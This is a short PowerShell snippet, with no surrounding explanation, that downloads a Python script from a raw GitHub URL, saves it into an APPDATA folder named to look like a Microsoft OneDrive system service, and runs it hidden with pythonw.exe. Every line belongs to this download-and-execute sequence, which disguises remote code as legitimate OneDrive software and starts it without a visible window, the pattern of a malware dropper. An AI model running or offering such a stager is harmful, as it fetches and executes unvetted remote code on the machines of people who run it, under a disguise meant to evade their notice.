
$pyurl = "https://raw.githubusercontent.com/userofnone2/none/refs/heads/main/onedrive_service_final.pyw"
$out = "$env:APPDATA\Microsoft\OneDrive\System\onedrive_service.pyw"
Invoke-WebRequest $pyurl -OutFile $out
Start-Process "pythonw.exe" $out
